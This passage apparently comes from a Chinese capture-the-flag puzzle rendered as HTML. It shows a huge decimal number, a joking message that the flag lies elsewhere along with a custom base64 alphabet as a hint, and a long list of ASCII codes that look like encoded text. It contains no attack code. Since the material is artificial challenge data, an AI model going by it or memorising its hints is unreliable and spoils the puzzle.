class="number">443872932387609604135299396505741465548187173913201730108838080408785609137741615659037699726062198174374869846350512862150233184688689942668777612350764221752081411865206415112660714146757211490177058729438092152878841125207571476701274343774749929595131015975243112000147909250609222224386395250420482153027423916850849907783377689363926605283859634466699503398576742091148637222466493674839458477079907442027781797995563797242127070058619307420720083582989814955638708836061722624212645970329914685584560535046789049745626271660729695633393935782143286042187281494621731489627398825041304828103510723776145870421596844268308768106563173361340578036769631671222365662779295856082169735142106857685245787867868939877997807147264885029965288918778095901444599350328636038539550470594610996135016178903533546176756754366885849810986458832457425478791696994121501106351218323543932789426433991366669735850704517003574890852690894671642558319499970231221568249671785792844423548113062674756417573895156509357966378010843640665977535211058606619931728275406042671149290064241331353833192521327454578922439604729609725523724886701113628781775137675047788670751939245996145899093702530500651486751530440279280899185557843975159425298926732152946633813864493232128464695128151024516359972838671657905047765173875917851092890649577562083138460019500783760812685048126396136492082495748040267453981267617425848056387144300693</span></span><br><span class="line">DATA_OUT: flag看到666c是不是特别兴奋，很可惜flag并不在这。（狗头保命），既然走到了这里，那我也给一个通关的关键信息拿去吧，去找到真正的flag吧：sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W                                 哎，对了。拿走之前看一看我精心挑选的笑话吧：猎人打猎，朝狐狸开枪，“砰”地一声枪响之后猎人死了。狐狸叉着腰，冷笑一声：</span><br><span class="line">“没想到吧，我是反射弧。”好不好笑， 有没有感觉一哆嗦，大脑更清晰了。ฅ՞•ﻌ•՞ ต</span><br><span class="line"></span><br><span class="line">SIZE_DATAL: <span class="number">74</span> <span class="number">82</span> <span class="number">70</span> <span class="number">84</span> <span class="number">67</span> <span class="number">53</span> <span class="number">83</span> <span class="number">70</span> <span class="number">71</span> <span class="number">53</span> <span class="number">83</span> <span class="number">85</span> <span class="number">52</span> <span class="number">83</span> <span class="number">84</span> <span class="number">86</span> <span class="number">72</span> <span class="number">66</span> <span class="number">84</span> <span class="number">84</span> <span class="number">67</span> <span class="number">82</span> <span class="number">50</span> <span class="number">83</span> <span class="number">75</span> <span class="number">86</span> <span class="number">83</span> <span class="number">69</span> <span class="number">50</span> <span class="number">78</span> <span class="number">75</span> <span class="number">86</span> <span class="number">73</span> <span class="number">85</span> <span class="number">89</span> <span class="number">70</span> <span class="number">67</span> <span class="number">83</span> <span class="number">50</span> <span class="number">77</span> <span class="number">79</span> <span class="number">86</span> <span class="number">70</span> <span class="number">85</span> <span class="number">87</span> <span class="number">77</span> <span class="number">76</span> <span class="number">76</span> <span class="number">71</span> <span class="number">86</span> <span class="number">75</span> <span class="number">87</span> <span class="number">73</span> <span class="number">84</span> <span class="number">75</span> <span class="number">76</span> <span class="number">74</span> <span class="number">90</span> <span class="number">83</span> <span class="number">69</span> <span class="number">50</span> <span class="number">78</span> <span class="number">75</span> <span class="number">86</span> <span class="number">77</span> <span class="number">82</span> <span class="number">70</span> <span class="number">85</span> <span class="number">87</span> <span class="number">89</span> <span class="number">51</span> <span class="number">69</span> <span class="number">74</span> <span class="number">85</span> <span class="number">51</span> <span class="number">86</span> <span class="number">75</span> <span class="number">90</span> <span class="number">67</span> <span class="number">78</span> <span class="number">71</span> <span class="number">86</span> <span class="number">75</span> <span class="number">85</span> <span class="number">50</span> <span class="number">83</span> <span class="number">75</span> <span class="number">81</span> <span class="number">77</span> <span class="number">78</span> <span class="number">88</span> <span class="number">69</span> <span class="number">50</span> <span class="number">87</span> <span class="number">67</span> <span class="number">86</span> <span class="number">77</span> <span class="number">82</span> <span class="number">71</span> <span class="number">84</span> <span class="number">75</span> <span class="number">86</span> <span class="number">75</span> <span class="number">78</span> <span class="number">77</span> <span class="number">77</span> <span class="number">50</span> <span class="number">88</span> <span class="number">77</span> <span class="number">82</span> <span class="number">75</span> <span class="number">76</span> <span class="number">71</span> <span class="number">69</span> <span class="number">50</span> <span class="number">85</span> <span class="number">83</span> <span class="number">53</span> <span class="number">83</span> <span class="number">69</span> <span class="number">79</span> <span class="number">70</span> <span class="number">87</span> <span class="number">84</span> <span class="number">77</span> <span class="number">82</span> <span class="number">68</span> <span class="number">82</span> <span class="number">78</span> <span class="number">90</span> <span class="number">86</span> <span class="number">84</span> <span class="number">79</span> <span class="number">53</span> <span class="number">76</span> <span class="number">78</span> <span class="number">71</span> <span class="number">90</span> <span class="number">67</span> <span class="number">71</span> <span class="number">89</span> <span class="number">87</span> <span class="number">68</span> <span class="number">86</span> <span class="number">79</span> <span class="number">86</span> <span class="number">89</span> <span class="number">85</span> <span class="number">71</span> <span class="number">53</span> <span class="number">75</span> <span class="number">89</span> <span class="number">75</span> <span class="number">86</span> <span class="number">87</span> <span class="number">84</span> <span class="number">77</span> <span class="number">82</span> <span class="number">68</span> <span class="number">82</span> <span class="number">77</span> <span class="number">82</span> <span class="number">66</span> <span class="number">71</span> <span class="number">52</span> <span class="number">90</span> <span class="number">68</span> <span class="number">78</span> <span class="number">71</span> <span class="number">90</span> <span class="number">74</span> <span class="number">69</span> <span class="number">52</span> <span class="number">84</span> <span class="number">76</span> <span class="number">87</span> <span class="number">73</span> <span class="number">82</span> <span class="number">89</span> <span class="number">87</span> <span class="number">73</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">79</span> <span class="number">86</span> <span class="number">87</span> <span class="number">84</span> <span class="number">77</span> <span class="number">85</span> <span class="number">83</span> <span class="number">79</span> <span class="number">77</span> <span class="number">82</span> <span class="number">71</span> <span class="number">88</span> <span class="number">75</span> <span class="number">52</span> <span class="number">76</span> <span class="number">79</span> <span class="number">78</span> <span class="number">77</span> <span class="number">50</span> <span class="number">86</span> <span class="number">75</span> <span class="number">51</span> <span class="number">74</span> <span class="number">87</span> <span class="number">73</span> <span class="number">82</span> <span class="number">87</span> <span class="number">71</span> <span class="number">73</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">77</span> <span class="number">82</span> <span class="number">87</span> <span class="number">84</span> <span class="number">77</span> <span class="number">85</span> <span class="number">83</span> <span class="number">86</span> <span class="number">74</span> <span class="number">86</span> <span class="number">51</span> <span class="number">70</span> <span class="number">69</span> <span class="number">86</span> <span class="number">76</span> <span class="number">69</span> <span class="number">74</span> <span class="number">85</span> <span class="number">50</span> <span class="number">88</span> <span class="number">75</span> <span class="number">90</span> <span class="number">67</span> <span class="number">67</span> <span class="number">78</span> <span class="number">90</span> <span class="number">75</span> <span class="number">87</span> <span class="number">73</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">74</span> <span class="number">90</span> <span class="number">83</span> <span class="number">69</span> <span class="number">50</span> <span class="number">78</span> <span class="number">75</span> <span class="number">86</span> <span class="number">78</span> <span class="number">90</span> <span class="number">86</span> <span class="number">84</span> <span class="number">79</span> <span class="number">86</span> <span class="number">76</span> <span class="number">69</span> <span class="number">74</span> <span class="number">85</span> <span class="number">50</span> <span class="number">86</span> <span class="number">67</span> <span class="number">87</span> <span class="number">68</span> <span class="number">86</span> <span class="number">71</span> <span class="number">86</span> <span class="number">75</span> <span class="number">85</span> <span class="number">75</span> <span class="number">84</span> <span class="number">76</span> <span class="number">69</span> <span class="number">79</span> <span class="number">70</span> <span class="number">87</span> <span class="number">84</span> <span class="number">77</span> <span class="number">82</span> <span class="number">68</span> <span class="number">77</span> <span class="number">77</span> <span class="number">82</span> <span class="number">71</span> <span class="number">84</span> <span class="number">75</span> <span class="number">86</span> <span class="number">75</span> <span class="number">89</span> <span class="number">79</span> <span class="number">85</span> <span class="number">51</span> <span class="number">88</span> <span class="number">73</span> <span class="number">82</span> <span class="number">74</span> <span class="number">87</span> <span class="number">75</span> <span class="number">74</span> <span class="number">75</span> <span class="number">71</span> <span class="number">73</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">75</span> <span class="number">86</span> <span class="number">83</span> <span class="number">71</span> <span class="number">69</span> <span class="number">79</span> <span class="number">68</span> <span class="number">81</span> <span class="number">78</span> <span class="number">74</span> <span class="number">50</span> <span class="number">85</span> <span class="number">87</span> <span class="number">87</span> <span class="number">67</span> <span class="number">76</span> <span class="number">71</span> <span class="number">66</span> <span class="number">50</span> <span class="number">87</span> <span class="number">87</span> <span class="number">84</span> <span class="number">68</span> <span class="number">67</span> <span class="number">79</span> <span class="number">85</span> <span class="number">51</span> <span class="number">69</span> <span class="number">87</span> <span class="number">81</span> <span class="number">82</span> <span class="number">81</span> <span class="number">74</span> <span class="number">82</span> <span class="number">67</span> <span class="number">88</span> <span class="number">75</span> <span class="number">87</span> <span class="number">68</span> <span class="number">70</span> <span class="number">77</span> <span class="number">82</span> <span class="number">66</span> <span class="number">68</span> <span class="number">73</span> <span class="number">78</span> <span class="number">76</span> <span class="number">74</span> <span class="number">71</span> <span class="number">86</span> <span class="number">88</span> <span class="number">69</span> <span class="number">85</span> <span class="number">83</span> <span class="number">82</span> <span class="number">80</span> <span class="number">77</span> <span class="number">70</span> <span class="number">69</span> <span class="number">85</span> <span class="number">87</span> <span class="number">53</span> <span class="number">84</span> <span class="number">89</span> <span class="number">79</span> <span class="number">70</span> <span class="number">70</span> <span class="number">69</span> <span class="number">69</span> <span class="number">87</span> <span class="number">67</span> <span class="number">84</span> <span class="number">79</span> <span class="number">82</span> <span class="number">71</span> <span class="number">86</span> <span class="number">81</span> <span class="number">83</span> <span class="number">66</span> <span class="number">82</span> <span class="number">78</span> <span class="number">78</span> <span class="number">74</span> <span class="number">72</span> <span class="number">75</span> <span class="number">83</span> <span class="number">50</span> <span class="number">72</span> <span class="number">75</span> <span class="number">82</span> <span class="number">68</span> <span class="number">88</span> <span class="number">73</span> <span class="number">86</span> <span class="number">83</span> <span class="number">83</span> <span class="number">79</span> <span class="number">86</span> <span class="number">69</span> <span class="number">88</span> <span class="number">69</span> <span class="number">53</span> <span class="number">74</span> <span class="number">87</span> <span class="number">78</span> <span class="number">74</span> <span class="number">71</span> <span class="number">87</span> <span class="number">67</span> <span class="number">87</span> <span class="number">67</span> <span class="number">76</span> <span class="number">73</span> <span class="number">74</span> <span class="number">73</span> <span class="number">88</span> <span class="number">65</span> <span class="number">84</span> <span class="number">66</span> <span class="number">88</span> <span class="number">78</span> <span class="number">90</span> <span class="number">86</span> <span class="number">85</span> <span class="number">89</span> <span class="number">81</span> <span class="number">82</span> <span class="number">82</span> <span class="number">79</span> <span class="number">86</span> <span class="number">73</span> <span class="number">86</span> <span class="number">77</span> <span class="number">77</span> <span class="number">68</span> <span class="number">78</span> <span class="number">79</span> <span class="number">82</span> <span class="number">70</span> <span class="number">87</span> <span class="number">75</span> <span class="number">82</span> <span class="number">50</span> <span class="number">74</span> <span class="number">79</span> <span class="number">74</span> <span class="number">70</span> <span class="number">85</span> <span class="number">50</span> <span class="number">83</span> <span class="number">50</span> <span class="number">74</span> <span class="number">71</span> <span class="number">66</span> <span class="number">76</span> <span class="number">69</span> <span class="number">75</span> <span class="number">84</span> <span class="number">75</span> <span class="number">81</span> <span class="number">79</span> <span class="number">70</span> <span class="number">71</span> <span class="number">85</span> <span class="number">52</span> <span class="number">85</span> <span class="number">75</span> <span class="number">71</span> <span class="number">74</span> <span class="number">78</span> <span class="number">50</span> <span class="number">70</span> <span class="number">69</span> <span class="number">85</span> <span class="number">67</span> <span class="number">78</span> <span class="number">75</span> <span class="number">89</span> <span class="number">50</span> <span class="number">69</span> <span class="number">81</span> <span class="number">81</span> <span class="number">75</span> <span class="number">79</span> <span class="number">75</span> <span class="number">86</span> <span class="number">70</span> <span class="number">85</span> <span class="number">50</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">76</span> <span class="number">66</span> <span class="number">88</span> <span class="number">69</span> <span class="number">83</span> <span class="number">83</span> <span class="number">51</span> <span class="number">78</span> <span class="number">77</span> <span class="number">81</span> <span class="number">88</span> <span class="number">86</span> <span class="number">77</span> <span class="number">78</span> <span class="number">90</span> <span class="number">90</span> <span class="number">75</span> <span class="number">89</span> <span class="number">50</span> <span class="number">85</span> <span class="number">81</span> <span class="number">84</span> <span class="number">74</span> <span class="number">80</span> <span class="number">77</span> <span class="number">86</span> <span class="number">83</span> <span class="number">85</span> <span class="number">50</span> <span class="number">83</span> <span class="number">50</span> <span class="number">82</span> <span class="number">73</span> <span class="number">78</span> <span class="number">85</span> <span class="number">88</span> <span class="number">75</span> <span class="number">77</span> <span class="number">76</span> <span class="number">86</span> <span class="number">75</span> <span class="number">70</span> <span class="number">67</span> <span class="number">87</span> <span class="number">54</span> <span class="number">52</span> <span class="number">75</span> <span class="number">76</span> <span class="number">74</span> <span class="number">77</span> <span class="number">90</span> <span class="number">88</span> <span class="number">79</span> <span class="number">50</span> <span class="number">74</span> <span class="number">86</span> <span class="number">74</span> <span class="number">78</span> <span class="number">69</span> <span class="number">71</span> <span class="number">73</span> <span class="number">54</span> <span class="number">74</span> <span class="number">81</span> <span class="number">79</span> <span class="number">53</span> <span class="number">71</span> <span class="number">68</span> <span class="number">75</span> <span class="number">86</span> <span class="number">74</span> <span class="number">87</span> <span class="number">79</span> <span class="number">81</span> <span class="number">51</span> <span class="number">84</span> <span class="number">65</span> <span class="number">77</span> <span class="number">83</span> <span class="number">76</span> <span class="number">74</span> <span class="number">86</span> <span class="number">70</span> <span class="number">70</span> <span class="number">85</span> <span class="number">50</span> <span class="number">83</span> <span class="number">78</span> <span class="number">71</span> <span class="number">65</span> <span class="number">89</span> <span class="number">87</span> <span class="number">52</span> <span class="number">89</span> <span class="number">50</span> <span class="number">89</span> <span class="number">77</span> <span class="number">70</span> <span class="number">71</span> <span class="number">87</span> <span class="number">87</span> <span class="number">85</span> <span class="number">83</span> <span class="number">73</span> <span class="number">78</span> <span class="number">74</span> <span class="number">50</span> <span class="number">87</span> <span class="number">89</span> <span class="number">53</span> <span class="number">51</span> <span class="number">69</span> <span class="number">71</span> <span class="number">65</span> <span class="number">52</span> <span class="number">87</span> <span class="number">89</span> <span class="number">84</span> <span class="number">74</span> <span class="number">87</span> <span class="number">72</span> <span class="number">66</span> <span class="number">52</span> <span class="number">71</span> <span class="number">83</span> <span class="number">90</span> <span class="number">50</span> <span class="number">76</span> <span class="number">74</span> <span class="number">73</span> <span class="number">52</span> <span class="number">87</span> <span class="number">69</span> <span class="number">78</span> <span class="number">68</span> <span class="number">87</span> <span class="number">74</span> <span class="number">81</span> <span class="number">51</span> <span class="number">84</span> <span class="number">75</span> <span class="number">84</span> <span class="number">66</span> <span class="number">84</span> <span class="number">71</span> <span class="number">53</span> <span class="number">76</span> <span class="number">69</span> <span class="number">52</span> <span class="number">53</span> <span class="number">68</span> <span class="number">72</span> <span class="number">74</span> <span class="number">78</span> <span class="number">83</span> <span class="number">85</span> <span class="number">85</span> <span class="number">76</span> <span class="number">90</span> <span class="number">86</span> <span class="number">79</span> <span class="number">66</span> <span class="number">70</span> <span class="number">70</span> <span class="number">77</span> <span class="number">77</span> <span class="number">74</span> <span class="number">83</span> <span class="number">74</span> <span class="number">78</span> <span class="number">50</span> <span class="number">85</span> <span class="number">50</span> <span class="number">78</span> <span class="number">83</span> <span class="number">82</span> <span class="number">77</span> <span class="number">52</span> <span class="number">89</span> <span class="number">84</span> <span class="number">83</span> <span class="number">79</span> <span class="number">75</span> <span class="number">87</span> <span class="number">77</span> <span class="number">69</span> <span class="number">90</span> <span class="number">69</span> <span class="number">89</span> <span class="number">78</span> <span class="number">51</span> <span class="number">66</span> <span class="number">79</span> <span class="number">81</span> <span class="number">52</span> <span class="number">85</span> <span class="number">75</span> <span class="number">90</span> <span class="number">76</span> <span class="number">68</span> <span class="number">78</span> <span class="number">70</span> <span class="number">71</span> <span class="number">86</span> <span class="number">81</span> <span class="number">52</span> <span class="number">83</span> <span class="number">78</span> <span class="number">74</span> <span class="number">78</span> <span class="number">73</span> <span class="number">85</span> <span class="number">85</span> <span class="number">79</span> <span class="number">74</span> <span class="number">88</span> <span class="number">78</span> <span class="number">90</span> <span class="number">51</span> <span class="number">70</span> <span class="number">67</span> <span class="number">50</span> <span class="number">51</span> <span class="number">79</span> <span class="number">79</span> <span class="number">74</span> <span class="number">70</span> <span class="number">88</span> <span class="number">79</span> <span class="number">78</span> <span class="number">76</span> <span class="number">90</span> <span class="number">75</span> <span class="number">70</span> <span class="number">69</span> <span class="number">84</span> <span class="number">81</span> <span class="number">77</span> <span class="number">84</span> <span class="number">79</span> <span class="number">73</span> <span class="number">52</span> <span class="number">51</span> <span class="number">86</span> <span class="number">71</span> <span class="number">83</span> <span class="number">75</span> <span class="number">78</span> <span class="number">75</span> <span class="number">66</span> <span class="number">75</span> <span class="number">84</span> <span class="number">67</span> <span class="number">86</span> <span class="number">83</span> <span class="number">81</span> <span class="number">73</span> <span class="number">78</span> <span class="number">85</span> <span class="number">87</span> <span class="number">69</span> <span class="number">78</span> <span class="number">67</span> <span class="number">76</span> <span class="number">71</span> <span class="number">70</span> <span class="number">68</span> <span class="number">87</span> <span class="number">67</span> <span class="number">89</span> <span class="number">84</span> <span class="number">74</span> <span class="number">74</span> <span class="number">85</span> <span class="number">50</span> <span class="number">71</span> <span class="number">73</span> <span class="number">83</span> <span class="number">76</span> <span class="number">72</span> <span class="number">71</span> <span class="number">82</span> <span class="number">51</span> <span class="number">84</span> <span class="number">71</span> <span class="number">52</span> <span class="number">83</span> <span class="number">82</span> <span class="number">73</span> <span class="number">77</span> <span class="number">90</span> <span class="number">85</span> <span class="number">69</span> <span class="number">83</span> <span class="number">50</span> <span class="number">89</span> <span class="number">78</span> <span class="number">90</span> <span class="number">68</span> <span class="number">84</span> <span class="number">65</span> <span class="number">77</span> <span class="number">68</span> <span class="number">85</span> <span class="number">74</span> <span class="number">85</span> <span class="number">89</span> <span class="number">69</span> <span class="number">75</span> <span class="number">84</span> <span class="number">74</span> <span class="number">81</span> <span class="number">71</span> <span class="number">86</span> <span class="number">52</span> <span class="number">69</span> <span class="number">83</span> <span class="number">54</span> <span class="number">74</span> <span class="number">82</span> <span class="number">78</span> <span class="number">86</span> <span class="number">70</span> <span class="number">87</span> <span class="number">71</span> <span class="number">77</span> <span class="number">67</span> <span class="number">85</span> <span class="number">74</span> <span class="number">73</span> <span class="number">51</span> <span class="number">88</span> <span class="number">75</span> <span class="number">78</span> <span class="number">50</span> <span class="number">78</span> <span class="number">75</span> <span class="number">90</span> <span class="number">52</span> <span class="number">69</span> <span class="number">52</span> <span class="number">53</span> <span class="number">67</span> <span class="number">72</span> <span class="number">71</span> <span class="number">66</span> <span class="number">50</span> <span class="number">68</span> <span class="number">71</span> <span class="number">89</span> <span class="number">84</span> <span class="number">66</span> <span class="number">75</span> <span class="number">70</span> <span class="number">77</span> <span class="number">72</span> <span class="number">83</span> <span class="number">51</span> <span class="number">51</span> <span class="number">88</span> <span class="number">73</span> <span class="number">86</span> <span class="number">72</span> <span class="number">71</span> <span class="number">75</span> <span class="number">54</span> <span class="number">75</span> <span class="number">70</span> <span class="number">79</span> <span class="number">52</span> <span class="number">89</span> <span class="number">84</span> <span class="number">67</span> <span class="number">81</span> <span class="number">50</span> <span class="number">67</span> <span class="number">71</span> <span class="number">82</span> <span class="number">90</span> <span class="number">71</span> <span class="number">52</span> <span class="number">86</span> <span class="number">83</span> <span class="number">89</span> <span class="number">73</span> <span class="number">70</span> <span class="number">73</span> <span class="number">87</span> <span class="number">69</span> <span class="number">54</span> <span class="number">68</span> <span class="number">88</span> <span class="number">73</span> <span class="number">78</span> <span class="number">90</span> <span class="number">69</span> <span class="number">87</span> <span class="number">52</span> <span class="number">66</span> <span class="number">84</span> <span class="number">73</span> <span class="number">53</span> <span class="number">81</span> <span class="number">85</span> <span class="number">67</span> <span class="number">50</span> <span class="number">76</span> <span class="number">83</span> <span class="number">71</span> <span class="number">53</span> <span class="number">76</span> <span class="number">69</span> <span class="number">83</span> <span class="number">86</span> <span class="number">84</span> <span class="number">79</span> <span class="number">73</span> <span class="number">70</span> <span class="number">50</span> <span class="number">69</span> <span class="number">52</span> <span class="number">89</span> <span class="number">75</span> <span class="number">84</span> <span class="number">71</span> <span class="number">77</span> <span class="number">51</span> <span class="number">84</span> <span class="number">73</span> <span class="number">86</span> <span class="number">67</span> <span class="number">75</span> <span class="number">77</span> <span class="number">73</span> <span class="number">89</span> <span class="number">84</span> <span class="number">69</span> <span class="number">51</span> <span class="number">75</span> <span class="number">72</span> <span class="number">74</span> <span class="number">77</span> <span class="number">88</span> <span class="number">88</span> <span class="number">73</span> <span class="number">89</span> <span class="number">51</span> <span class="number">80</span> <span class="number">73</span> <span class="number">53</span> <span class="number">50</span> <span class="number">69</span> <span class="number">75</span> <span class="number">51</span> <span class="number">84</span> <span class="number">86</span> <span class="number">78</span> <span class="number">70</span> <span class="number">90</span> <span class="number">69</span> <span class="number">87</span> <span class="number">89</span> <span class="number">75</span> <span class="number">78</span> <span class="number">79</span> <span class="number">53</span> <span class="number">76</span> <span class="number">71</span> <span class="number">87</span> <span class="number">50</span> <span class="number">83</span> <span class="number">67</span> <span class="number">75</span> <span class="number">90</span> <span class="number">89</span> <span class="number">69</span> <span class="number">75</span> <span class="number">53</span> <span class="number">90</span> <span class="number">85</span> <span class="number">78</span> <span class="number">81</span> <span class="number">90</span> <span class="number">88</span> <span class="number">75</span> <span class="number">79</span> <span class="number">68</span> <span class="number">88</span> <span class="number">76</span> <span class="number">66</span> <span class="number">67</span> <span class="number">87</span> <span class="number">52</span> <span class="number">77</span> <span class="number">74</span> <span class="number">82</span> <span class="number">75</span> <span class="number">90</span> <span class="number">70</span> <span class="number">86</span> <span class="number">65</span> <span class="number">90</span> <span class="number">67</span> <span class="number">76</span> <span class="number">75</span> <span class="number">77</span> <span class="number">51</span> <span class="number">68</span> <span class="number">83</span> <span class="number">89</span> <span class="number">82</span> <span class="number">89</span> <span class="number">75</span> <span class="number">66</span> <span class="number">88</span> <span class="number">69</span> <span class="number">52</span> <span class="number">78</span> <span class="number">67</span> <span class="number">73</span> <span class="number">74</span> <span class="number">74</span> <span class="number">86</span> <span class="number">84</span> <span class="number">69</span> <span class="number">52</span> <span class="number">75</span> <span class="number">70</span> <span class="number">75</span> <span class="number">90</span> <span class="number">73</span> <span class="number">84</span> <span class="number">65</span> <span class="number">50</span> <span class="number">75</span> <span class="number">74</span> <span class="number">77</span> <span class="number">82</span> <span class="number">51</span> <span class="number">85</span> <span class="number">87</span> <span class="number">81</span> <span class="number">82</span> <span class="number">85</span> <span class="number">77</span> <span class="number">70</span> <span class="number">85</span> <span class="number">87</span> <span class="number">69</span> <span class="number">78</span> <span class="number">68</span> <span class="number">87</span> <span class="number">74</span> <span class="number">74</span> <span class="number">72</span> <span class="number">70</span> <span class="number">67</span> <span class="number">78</span> <span class="number">68</span> <span class="number">78</span> <span class="number">78</span> <span class="number">78</span> <span class="number">74</span> <span class="number">70</span> <span class="number">71</span> <span class="number">77</span> <span class="number">90</span> <span class="number">88</span> <span class="number">77</span> <span class="number">69</span> <span class="number">88</span> <span class="number">88</span> <span class="number">73</span> <span class="number">89</span> <span class="number">84</span> <span class="number">66</span> <span class="number">75</span> <span class="number">66</span> <span class="number">73</span> <span class="number">85</span> <span class="number">50</span> <span class="number">90</span> <span class="number">74</span> <span class="number">80</span> <span class="number">74</span> <span class="number">73</span> <span class="number">88</span> <span class="number">86</span> <span class="number">67</span> <span class="number">83</span> <span class="number">75</span> <span class="number">89</span> <span class="number">79</span> <span class="number">73</span> <span class="number">50</span> <span class="number">72</span> <span class="number">85</span> <span class="number">53</span> <span class="number">68</span> <span class="number">72</span> <span class="number">75</span> <span class="number">77</span> <span class="number">51</span> <span class="number">85</span> <span class="number">83</span> <span class="number">82</span> <span class="number">74</span> <span class="number">90</span> <span class="number">79</span> <span class="number">70</span> <span class="number">71</span> <span class="number">83</span> <span class="number">54</span> <span class="number">52</span> <span class="number">50</span> <span class="number">79</span> <span class="number">71</span> <span class="number">70</span> <span class="number">68</span> <span class="number">86</span> <span class="number">81</span> <span class="number">85</span> <span class="number">51</span> <span class="number">74</span> <span class="number">71</span> <span class="number">65</span> <span class="number">89</span> <span class="number">85</span> <span class="number">87</span> <span class="number">50</span> <span class="number">84</span> <span class="number">88</span> <span class="number">71</span> <span class="number">82</span> <span class="number">65</span> <span class="number">85</span> <span class="number">83</span> <span class="number">53</span> <span class="number">75</span> <span class="number">69</span> <span class="number">75</span> <span class="number">66</span> <span class="number">88</span> <span class="number">69</span> <span class="number">50</span> <span class="number">50</span> <span class="number">50</span> <span class="number">50</span> <span class="number">74</span> <span class="number">82</span> <span class="number">84</span> <span class="number">84</span> <span class="number">71</span> <span class="number">52</span> <span class="number">66</span> <span class="number">82</span> <span class="number">73</span> <span class="number">85</span> <span class="number">50</span> <span class="number">84</span> <span class="number">77</span> <span class="number">79</span> <span class="number">75</span> <span class="number">78</span> <span class="number">71</span> <span class="number">74</span> <span class="number">51</span> <span class="number">85</span> <span class="number">67</span> <span class="number">84</span> <span class="number">82</span> <span class="number">86</span> <span class="number">73</span> <span class="number">90</span> <span class="number">86</span> <span class="number">69</span> <span class="number">83</span> <span class="number">87</span> <span class="number">67</span> <span class="number">78</span> <span class="number">78</span> <span class="number">90</span> <span class="number">82</span> <span class="number">85</span> <span class="number">87</span> <span class="number">86</span> <span class="number">83</span> <span class="number">76</span> <span class="number">74</span> <span class="number">85</span> <span class="number">50</span> <span class="number">69</span> <span class="number">77</span> <span class="number">53</span> <span class="number">67</span> <span class="number">79</span> <span class="number">74</span> <span class="number">77</span> <span class="number">51</span> <span class="number">86</span> <span class="number">67</span> <span class="number">53</span> <span class="number">90</span> <span class="number">82</span> <span class="number">77</span> <span class="number">82</span> <span class="number">88</span> <span class="number">68</span> <span class="number">65</span> <span class="number">51</span> <span class="number">90</span> <span class="number">88</span> <span class="number">78</span> <span class="number">70</span> <span class="number">67</span> <span class="number">84</span> <span class="number">75</span> <span class="number">87</span> <span class="number">67</span> <span class="number">75</span> <span class="number">74</span> <span class="number">90</span> <span class="number">73</span> <span class="number">87</span> <span class="number">77</span> <span class="number">77</span> <span class="number">76</span> <span class="number">68</span> <span class="number">71</span> <span class="number">82</span> <span class="number">69</span> <span class="number">87</span> <span class="number">85</span> <span class="number">81</span> <span class="number">84</span> <span class="number">80</span> <span class="number">74</span> <span class="number">90</span> <span class="number">85</span> <span class="number">88</span> <span class="number">83</span> <span class="number">77</span> <span class="number">66</span> <span class="number">88</span> <span class="number">78</span> <span class="number">70</span> <span class="number">84</span> <span class="number">86</span> <span class="number">81</span> <span class="number">83</span> <span class="number">67</span> <span class="number">76</span> <span class="number">73</span> <span class="number">73</span> <span class="number">90</span> <span class="number">86</span> <span class="number">73</span> <span class="number">50</span> <span class="number">84</span> <span class="number">67</span> <span class="number">78</span> <span class="number">82</span> <span class="number">73</span> <span class="number">69</span> <span class="number">75</span> <span class="number">50</span> <span class="number">50</span> <span class="number">76</span> <span class="number">71</span> <span class="number">90</span> <span class="number">69</span> <span class="number">87</span> <span class="number">69</span> <span class="number">85</span> <span class="number">84</span> <span class="number">77</span> <span class="number">74</span> <span class="number">85</span> <span class="number">50</span> <span class="number">87</span> <span class="number">67</span> <span class="number">90</span> <span class="number">74</span> <span class="number">90</span> <span class="number">74</span> <span class="number">86</span> <span class="number">52</span> <span class="number">70</span> <span class="number">85</span> <span class="number">50</span> <span class="number">83</span> <span class="number">74</span> <span class="number">77</span> <span class="number">86</span> <span class="number">68</span> <span class="number">70</span> <span class="number">81</span> <span class="number">86</span> <span class="number">82</span> <span class="number">88</span> <span class="number">71</span> <span class="number">70</span> <span class="number">70</span> <span class="number">71</span> <span class="number">87</span> <span class="number">85</span> <span class="number">66</span> <span class="number">89</span> <span class="number">74</span> <span class="number">74</span> <span class="number">90</span> <span class="number">71</span> <span class="number">52</span> <span class="number">54</span> <span class="number">67</span> <span class="number">89</span> <span class="number">71</span> <span class="number">85</span> <span class="number">89</span> <span class="number">72</span> <span class="number">83</span> <span class="number">87</span> <span class="number">66</span> <span class="number">80</span> <span class="number">71</span> <span class="number">85</span> <span class="number">52</span> <span class="number">69</span> <span class="number">87</span> <span class="number">89</span> <span class="number">82</span> <span class="number">81</span> <span class="number">74</span> <span class="number">70</span> <span class="number">86</span> <span class="number">71</span> <span class="number">69</span> <span class="number">77</span> <span class="number">76</span> <span class="number">76</span> <span class="number">78</span> <span class="number">86</span> <span class="number">86</span> <span class="number">84</span> <span class="number">83</span> <span class="number">52</span> <span class="number">75</span> <span class="number">78</span> <span class="number">79</span> <span class="number">81</span> <span class="number">52</span> <span class="number">68</span> <span class="number">75</span> <span class="number">83</span> <span class="number">83</span> <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">89</span> <span class="number">68</span> <span class="number">71</span> <span class="number">82</span> <span class="number">74</span> <span class="number">86</span> <span class="number">78</span> <span class="number">66</span> <span class="number">70</span> <span class="number">85</span> <span class="number">83</span> <span class="number">78</span> <span class="number">75</span> <span class="number">70</span> <span class="number">78</span> <span class="number">90</span> <span class="number">72</span> <span class="number">68</span> <span class="number">73</span> <span class="number">50</span> <span class="number">67</span> <span class="number">70</span> <span class="number">79</span> <span class="number">85</span> <span class="number">51</span> <span class="number">85</span> <span class="number">50</span> <span class="number">77</span> <span class="number">50</span> <span class="number">78</span> <span class="number">77</span> <span class="number">70</span> <span class="number">87</span> <span class="number">85</span> <span class="number">71</span> <span class="number">83</span> <span class="number">75</span> <span class="number">83</span> <span class="number">77</span> <span class="number">70</span> <span class="number">77</span> <span class="number">71</span> <span class="number">87</span> <span class="number">78</span> <span class="number">50</span> <span class="number">87</span> <span class="number">71</span> <span class="number">77</span> <span class="number">51</span> <span class="number">84</span> <span class="number">65</span> <span class="number">79</span> <span class="number">66</span> <span class="number">84</span> <span class="number">70</span> <span class="number">52</span> <span 